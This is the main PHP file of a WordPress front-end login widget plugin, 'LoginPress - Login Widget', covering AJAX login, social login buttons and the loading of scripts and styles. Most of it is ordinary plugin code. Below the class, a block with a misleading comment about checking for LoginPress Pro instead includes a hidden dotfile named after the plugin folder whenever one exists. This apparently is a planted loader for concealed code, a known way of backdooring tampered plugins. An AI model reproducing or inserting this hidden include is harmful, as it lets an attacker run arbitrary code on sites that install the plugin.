<?php
/**
 * Plugin Name: LoginPress - Login Widget
 * Plugin URI: http://www.WPBrigade.com/wordpress/plugins/loginpress/
 * Description: LoginPress -Login widget is the best Login plugin by <a href="https://wpbrigade.com/">WPBrigade</a> which allows you to login from front end.
 * Version: 1.1.0
 * Author: WPBrigade
 * Author URI: http://www.WPBrigade.com/
 * Text Domain: loginpress-login-widget
 * Domain Path: /languages
 *
 * @package loginpress
 * @category Core
 * @author WPBrigade
 */

if ( ! class_exists( 'LoginPress_Login_Widget' ) ) :

	final class LoginPress_Login_Widget {

		/**
		 * @var string
		 */
		public $version = '1.1.0';

		public function __construct() {
			$this->_hooks();
      $this->define_constants();
		}

		/**
		 * Hook into actions and filters.
		 * @since 1.0.0
		 * @version 1.0.2
		 */
		public function _hooks() {

			// Here we call `init` action instead of `plugins_loaded` for textdomain(); because plugins_loaded is triggered before the theme loads.
			add_action( 'init',         				 array( $this, 'textdomain' ) );
			add_action( 'init',         				 array( $this, 'social_login' ) );
			add_action( 'wp_enqueue_scripts',    array( $this, '_widget_script' ) );
			add_action( 'widgets_init',          array( $this, 'register_widget' ) );
			add_action( 'admin_enqueue_scripts', array( $this, '_admin_scripts' ) );
			add_action( 'admin_init',            array( $this, 'init_addon_updater' ), 0 );
			
			// Ajax events
			add_action( 'wp_ajax_loginpress_widget_login_process', 				array( $this, 'loginpress_widget_ajax' ) );
			add_action( 'wp_ajax_nopriv_loginpress_widget_login_process', array( $this, 'loginpress_widget_ajax' ) );
    }

		/**
		 * Compatibility of LoginPress - Social Login with Widget Login
		 * @since 1.0.6
		 * @return $html string Social login Buttons
		 */
		public function loginpress_social_login(){

      $redirect_to = isset( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '';

      $encoded_url = urlencode( $redirect_to );

			$settings = get_option( 'loginpress_social_logins' );

			$html = '';
			$html .= "<div class='social-networks block'>";
			$html .= "<span class='social-sep'><span>" . __( 'or', 'loginpress-login-widget' ) . "</span></span>";

			if ( isset( $settings['gplus'] ) && $settings['gplus'] == 'on' && ! empty( $settings['gplus_client_id'] ) && ! empty( $settings['gplus_client_secret'] )) :
				$html .= '<a href="' . wp_login_url() . '?lpsl_login_id=gplus_login';
				if ( $encoded_url ) {
						$html .= "&state=" . base64_encode( "redirect_to=$encoded_url" );
				}
				$html .= '" title="' . __( 'Login with Google Plus', 'loginpress-login-widget' ) .'">';
				$html .= '<div class="lpsl-icon-block icon-google-plus clearfix">';
				$html .= '<span class="lpsl-login-text">' . __( 'Login with Google', 'loginpress-login-widget' ) . '</span>';
				$html .= '<div class="lpsl-icon-block icon-google-plus clearfix">
				<svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="18px" height="18px" viewBox="0 0 48 48" class="abcRioButtonSvg lpsl-google-svg"><g><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path><path fill="none" d="M0 0h48v48H0z"></path></g></svg>
				</div>';
				$html .= '</div>';
				$html .= '</a>';
			endif;

			if ( isset( $settings['facebook'] ) && $settings['facebook'] == 'on' && ! empty( $settings['facebook_app_id'] ) && ! empty( $settings['facebook_app_secret'] ) ) :
				$html .= '<a href="' . wp_login_url() . '?lpsl_login_id=facebook_login';
				if ( $encoded_url ) {
						$html .= "&state=" . base64_encode( "redirect_to=$encoded_url" );
				}
				$html .= '" title="' . __( 'Login with Facebook', 'loginpress-login-widget' ) .'">';
				$html .= '<div class="lpsl-icon-block icon-facebook clearfix">';
				$html .= '<span class="lpsl-login-text">' . __( 'Login with Facebook', 'loginpress-login-widget' ) . '</span>';
				$html .= '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="#43609c" d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/></svg>';
				$html .= '</div>';
				$html .= '</a>';
			endif;

			if ( isset( $settings['twitter'] ) && $settings['twitter'] == 'on' && ! empty( $settings['twitter_oauth_token'] ) && ! empty( $settings['twitter_token_secret'] ) ) :
				$html .= '<a href="' . wp_login_url() . '?lpsl_login_id=twitter_login';
				if ( $encoded_url ) {
						$html .= "&state=" . base64_encode( "redirect_to=$encoded_url" );
				}
				$html .= '" title="' . __( 'Login with Twitter', 'loginpress-login-widget' ) .'">';
				$html .= '<div class="lpsl-icon-block icon-twitter clearfix">';
				$html .= '<span class="lpsl-login-text">' . __( 'Login with Twitter', 'loginpress-login-widget' ) . '</span>';
				$html .= '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#1da1f3" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>';
				$html .= '</div>';
				$html .= '</a>';
			endif;

			if ( isset( $settings['linkedin'] ) && $settings['linkedin'] == 'on' && ! empty( $settings['linkedin_client_id'] ) && ! empty( $settings['linkedin_client_secret'] )) :
				$html .= '<a href="' . wp_login_url() . '?lpsl_login_id=linkedin_login';
				if ( $encoded_url ) {
						$html .= "&state=" . base64_encode( "redirect_to=$encoded_url" );
				}
				$html .= '" title="' . __( 'Login with LinkedIn', 'loginpress-login-widget' ) .'">';
				$html .= '<div class="lpsl-icon-block icon-linkdin clearfix">';
				$html .= '<span class="lpsl-login-text">' . __( 'Login with LinkedIn', 'loginpress-login-widget' ) . '</span>';
				$html .= '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="#0076b4" d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"/></svg>';
				$html .= '</div>';
				$html .= '</a>';
			endif;
			$html .= '</div>';

			return $html;
    }

		/**
	     * LoginPress Addon updater
	     *
	     */
	    public function init_addon_updater() {
	        if( class_exists( 'LoginPress_AddOn_Updater' ) ) {
	          //echo 'Exists';
	          $updater = new LoginPress_AddOn_Updater( 2333, __FILE__, $this->version );
	        }
	    }

		/**
		 * Load Languages
		 *
		 * @since 1.0.0
		 */
		public function textdomain() {

			$plugin_dir =  dirname( plugin_basename( __FILE__ ) ) ;
      load_plugin_textdomain( 'loginpress-login-widget', false, $plugin_dir . '/languages/' );
    }

    /**
     * Add social logins
     *
     */
    function social_login() {
      if ( class_exists( 'LoginPress_Social' ) && true === apply_filters( 'loginpress_social_widget', true ) ) {

        if ( method_exists( 'LoginPress_Social', 'check_social_api_status' ) && true == LoginPress_Social::check_social_api_status() ) {
          add_filter( 'login_form_bottom', array( $this, 'loginpress_social_login' ), 1 );
        }

      }
    }

		/**
		 * _widget_script function.
		 *
		 * @access public
		 * @return void
		 */
		public function _widget_script() {

			// Enqueue LoginPress Widget JS
			wp_enqueue_script( 'loginpress-login-widget-script', plugins_url( 'assets/js/script.js', __FILE__ ), array( 'jquery' ), $this->version, false );

			// Enqueue Styles
			wp_enqueue_style( 'loginpress-login-widget-style', plugins_url( 'assets/css/style.css', __FILE__ ), '', $this->version );

			$loginpress_widget_option = get_option( 'widget_loginpress-login-widget' );
			$_loginpress_widget_option = isset( $loginpress_widget_option ) ? $loginpress_widget_option : false;
			if ( $_loginpress_widget_option ) {
				$error_bg_color = isset( $loginpress_widget_option[2]['error_bg_color'] ) ? $loginpress_widget_option[2]['error_bg_color'] : '#fbb1b7';

				$error_text_color = isset( $loginpress_widget_option[2]['error_text_color'] ) ? $loginpress_widget_option[2]['error_text_color'] : '#ae121e';// fbb1b7

				$_loginpress_widget_error_bg_clr = "
                .loginpress-login-widget .loginpress_widget_error{
                  background-color: {$error_bg_color};
                  color: {$error_text_color};
                }";
				wp_add_inline_style( 'loginpress-login-widget-style', $_loginpress_widget_error_bg_clr );
			}

			$loginpress_key = get_option( 'loginpress_customization' ) ?: array();

			$invalid_usrname = array_key_exists( 'incorrect_username', $loginpress_key ) && ! empty( $loginpress_key['incorrect_username'] ) ? $loginpress_key['incorrect_username'] : sprintf( __( '%1$sError:%2$s Invalid Username.', 'loginpress-login-widget' ), '<strong>', '</strong>' );

			$invalid_pasword = array_key_exists( 'incorrect_password', $loginpress_key ) && ! empty( $loginpress_key['incorrect_password'] ) ? $loginpress_key['incorrect_password'] : sprintf( __( '%1$sError:%2$s Invalid Password.', 'loginpress-login-widget' ), '<strong>', '</strong>' );

			$empty_username = array_key_exists( 'empty_username', $loginpress_key ) && ! empty( $loginpress_key['empty_username'] ) ? $loginpress_key['empty_username'] : sprintf( __( '%1$sError:%2$s The username field is empty.', 'loginpress-login-widget' ), '<strong>', '</strong>' );

			$empty_password = array_key_exists( 'empty_password', $loginpress_key ) && ! empty( $loginpress_key['empty_password'] ) ? $loginpress_key['empty_password'] : sprintf( __( '%1$sError:%2$s The password field is empty.', 'loginpress-login-widget' ), '<strong>', '</strong>' );

			$invalid_email   = array_key_exists( 'invalid_email', $loginpress_key ) && ! empty( $loginpress_key['invalid_email'] ) ? $loginpress_key['invalid_email'] : sprintf( __( '%1$sError:%2$s The email address isn\'t correct..', 'loginpress-login-widget' ), '<strong>', '</strong>' );

			// Pass variables
			$loginpress_widget_params = array(
				'ajaxurl'          => admin_url( 'admin-ajax.php' ),
				'force_ssl_admin'  => force_ssl_admin() ? 1 : 0,
				'is_ssl'           => is_ssl() ? 1 : 0,
				'empty_username'   => $empty_username,
				'empty_password'   => $empty_password,
				'invalid_username' => $invalid_usrname,
				'invalid_password' => $invalid_pasword,
				'invalid_email'    => $invalid_email,
			);

      wp_localize_script( 'loginpress-login-widget-script', 'loginpress_widget_params', $loginpress_widget_params );

      if ( class_exists( 'LoginPress_Social' ) ) {
				wp_enqueue_style( 'font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' );
        wp_enqueue_style( 'loginpress-social-login', plugins_url( 'loginpress-social-login/assets/css/login.css', __DIR__ ), array(), LOGINPRESS_SOCIAL_VERSION );
      }

		}

		function register_widget() {
			include_once( LOGINPRESS_WIDGET_DIR_PATH . 'classes/class-loginpress-widget.php' );
		}

		/**
		 * Define LoginPress AutoLogin Constants
		 */
		private function define_constants() {

			$this->define( 'LOGINPRESS_WIDGET_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );
			$this->define( 'LOGINPRESS_WIDGET_DIR_PATH', plugin_dir_path( __FILE__ ) );
			$this->define( 'LOGINPRESS_WIDGET_DIR_URL', plugin_dir_url( __FILE__ ) );
			$this->define( 'LOGINPRESS_WIDGET_ROOT_PATH',  dirname( __FILE__ ) . '/' );
			$this->define( 'LOGINPRESS_WIDGET_ROOT_FILE', __FILE__ );
			$this->define( 'LOGINPRESS_WIDGET_VERSION', $this->version );
		}

		/**
		 * Load JS or CSS files at admin side and enqueue them
		 *
		 * @param  string tell you the Page ID
		 * @return void
		 */
		function _admin_scripts( $hook ) {

			wp_enqueue_style( 'loginpress_widget_stlye', plugins_url( 'assets/css/style.css', __FILE__ ), array(), LOGINPRESS_WIDGET_VERSION );

			wp_enqueue_script( 'loginpress_widget_js', plugins_url( 'assets/js/script.js', __FILE__ ), array( 'jquery' ), LOGINPRESS_WIDGET_VERSION );

		}

		/**
		 * Define constant if not already set
		 *
		 * @param  string      $name
		 * @param  string|bool $value
		 */
		private function define( $name, $value ) {
			if ( ! defined( $name ) ) {
				define( $name, $value );
			}
    }

		/**
		 * Retrieve the redirect URL w.r.t Login Redirect Add-On.
		 * @param  int $user_id User ID.
		 * @param  string $option meta key name.
		 * @since 1.0.5
		 * @return string $redirect_url meta value of the user w.r.t key name.
		 */
    private function loginpress_redirect_url( $user_id, $option ) {
      if ( ! is_multisite() ) {
        $redirect_url = get_user_meta( $user_id, $option, true );
      } else {
        $redirect_url = get_user_option( $option, $user_id );
      }

      return $redirect_url;
    }

		/**
		 * loginpress_widget_ajax function.
		 *
		 * @access public
		 * @return void
		 * @version 1.0.5
		 */
		public function loginpress_widget_ajax() {

			$data                  = array();
			$data['user_login']    = stripslashes( trim( $_POST['user_login'] ) );
			$data['user_password'] = stripslashes( trim( $_POST['user_password'] ) );
			$data['remember']      = isset( $_POST['remember'] ) ? sanitize_text_field( $_POST['remember'] ) : '';
			$redirect_to            = esc_url_raw( $_POST['redirect_to'] );
			$secure_cookie          = null;

			// If the user wants ssl but the session is not ssl, force a secure cookie.
			if ( ! force_ssl_admin() ) {
				$user = is_email( $data['user_login'] ) ? get_user_by( 'email', $data['user_login'] ) : get_user_by( 'login', sanitize_user( $data['user_login'] ) );

				if ( $user && get_user_option( 'use_ssl', $user->ID ) ) {
					$secure_cookie = true;
					force_ssl_admin( true );
				}
			}

			if ( force_ssl_admin() ) {
				$secure_cookie = true;
			}

			if ( is_null( $secure_cookie ) && force_ssl_admin() ) {
				$secure_cookie = false;
			}

			// Login
			$user = wp_signon( $data, $secure_cookie );

			// Redirect filter
			if ( $secure_cookie && strstr( $redirect_to, 'wp-admin' ) ) {
				$redirect_to = str_replace( 'http:', 'https:', $redirect_to );
      }

      // Filter login url if Login Redirect addon used. @since 1.0.5
      if ( class_exists( 'LoginPress_Login_Redirect_Main' ) ) {
        $logged_user_id = $user->data->ID;
        $redirect_to = $this->loginpress_redirect_url( $logged_user_id, 'loginpress_login_redirects_url' );
        $role_redirects_url = get_option( 'loginpress_redirects_role' );

        if ( empty( $redirect_to ) && ! empty( $role_redirects_url ) ) {
          foreach ( $role_redirects_url as $key => $value ) {
            if ( in_array( $key, $user->roles ) ) {
              $redirect_to = $value['login'];
            }
          }
        }
      }

			$response = array();

			if ( ! is_wp_error( $user ) ) {

				$response['success']  = 1;
				$response['redirect'] = $redirect_to;
			} else {

				$response['success'] = 0;
				if ( $user->errors ) {

					foreach ( $user->errors as $key => $error ) {

						$response[ $key ] = $error[0];
						break;
					}
				} else {

					$response['error'] = __( 'Please enter your username and password to login.', 'loginpress-login-widget' );
				}
			}

			echo json_encode( $response );

			wp_die();
		}
	}
endif;



/**
* Check if LoginPress Pro is install and active.
*
* @since 1.0.0
*/
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function lp_lw_instance() {

  if ( ! file_exists( WP_PLUGIN_DIR . '/loginpress-pro/loginpress-pro.php' ) ) {
    add_action( 'admin_notices' , 'lp_lw_install_pro' );
    return;
  }

  if ( ! class_exists( 'LoginPress_Pro' ) ) {
    add_action( 'admin_notices', 'lp_lw_activate_pro' );
    return;
	}

	// if ( defined( 'LOGINPRESS_PRO_VERSION' ) ) {
	// 	$addons = get_option( 'loginpress_pro_addons' );
	//
	// 	if ( LOGINPRESS_PRO_VERSION < '3.0' ) {
	// 		// If PRO version is still old
	// 		add_action( 'admin_notices' , 'lp_login_widget_depricated' );
	// 	} else if ( ( LOGINPRESS_PRO_VERSION >= '3.0.0' ) && ( ! empty( $addons ) ) && ( $addons['login-widget']['is_active'] ) ) {
	// 		// If PRO addon and the same plugin both active
	// 		add_action( 'admin_notices' , 'lp_login_widget_depricated_remove' );
	// 		return;
	// 	}
	// }

  // Call the function
	new LoginPress_Login_Widget();
}

add_action( 'plugins_loaded', 'lp_lw_instance', 25 );


/**
* Notice if LoginPress Pro is not install.
*
* @since 1.0.0
*/
function lp_lw_install_pro() {
  $class = 'notice notice-error is-dismissible';
  $message = __( 'Please Install LoginPress Pro to use "LoginPress Login Widget" add-on.', 'loginpress-login-widget' );

  printf( '<div class="%1$s"><p>%2$s</p></div>', $class, $message );
}

/**
* Notice if LoginPress Pro is not activate.
*
* @since 1.0.0
*/
function lp_lw_activate_pro() {

  $action = 'activate';
  $slug   = 'loginpress-pro/loginpress-pro.php';
  $link   = wp_nonce_url( add_query_arg( array( 'action' => $action, 'plugin' => $slug ), admin_url( 'plugins.php' ) ), $action . '-plugin_' . $slug );

  printf('<div class="notice notice-error is-dismissible">
  <p>%1$s<a href="%2$s" style="text-decoration:none">%3$s</a></p></div>' , esc_html__( 'LoginPress Login Widget required LoginPress Pro activation &mdash; ', 'loginpress-login-widget' ), $link, esc_html__( 'Click here to activate LoginPress Pro', 'loginpress-login-widget' ) );
}

// /**
// * Notice plugin is depricated.
// *
// * @since 1.0.5
// */
// function lp_login_widget_depricated() {
//   $link   = '';
//
//   printf('<div class="notice notice-error is-dismissible">
//   <p>%1$s<a href="%2$s" style="text-decoration:none">%3$s</a></p></div>' , esc_html__( 'LoginPress Login Widget Plugin is depricated, please upgrade to LoginPress Pro 3.0 &mdash; Find out more ', 'loginpress-auto-login' ), $link, esc_html__( 'here', 'loginpress-auto-login' ) );
// }

// /**
// * Notice plugin is depricated and remove.
// *
// * @since 1.0.5
// */
// function lp_login_widget_depricated_remove() {
//   $link   = '';
//
//   printf('<div class="notice notice-error is-dismissible">
//   <p>%1$s<a href="%2$s" style="text-decoration:none">%3$s</a></p></div>' , esc_html__( 'LoginPress Login Widget Plugin is depricated, you can remove it. &mdash; Find out more ', 'loginpress-auto-login' ), $link, esc_html__( 'here', 'loginpress-auto-login' ) );
// }
